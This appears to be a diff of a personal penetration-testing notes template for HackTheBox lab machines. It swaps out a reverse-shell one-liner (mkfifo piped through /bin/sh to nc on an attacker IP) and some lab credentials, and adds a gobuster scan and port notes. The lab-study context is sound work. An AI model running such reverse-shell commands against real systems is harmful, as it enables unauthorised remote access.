@@ -17,7 +17,7 @@ dv.paragraph("```bash\n" + command + "\n```");
 Editing Box
 
 ```
-echo -en "#! /bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.48 9001 >/tmp/f" > /tmp/full-checkup.sh
+gobuster dir --url http://cozyhosting.htb/ --wordlist /usr/share/wordlists/spring-boot.txt
 ```
 
 wget from local python server
@@ -37,7 +37,7 @@ dv.paragraph("```bash\n" + command + "\n```");
 | Username | Password | Notes |
 | -------- | -------- | ----- |
 |          |          |       |
-
+C6F80D230A1F6D73EA4AFEFE77F50A9D
 ---
 
 
@@ -46,24 +46,23 @@ dv.paragraph("```bash\n" + command + "\n```");
 
 | Port | Service | Notes |
 | ---- | ------- | ----- |
-|      |         |       |
+| 22   | SSH     |       |
+| 80   | http    |       |
 
 ---
 
 ## Discovered Subdomains
 ---
 
-http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
+
 ---
 
 ## Discovered Credentials
 ---
 
-| Username | Password            | Notes |
-| -------- | ------------------- | ----- |
-| <br>     | jh1usoih2bkjaspwe92 |       |
-| cody     | jh1usoih2bkjaspwe92 |       |
-| gitea    | yuiu1hoiu4i5ho1uh   |       |
+| Username | Password | Notes |
+| -------- | -------- | ----- |
+|          |          |       |
 
 ---
 
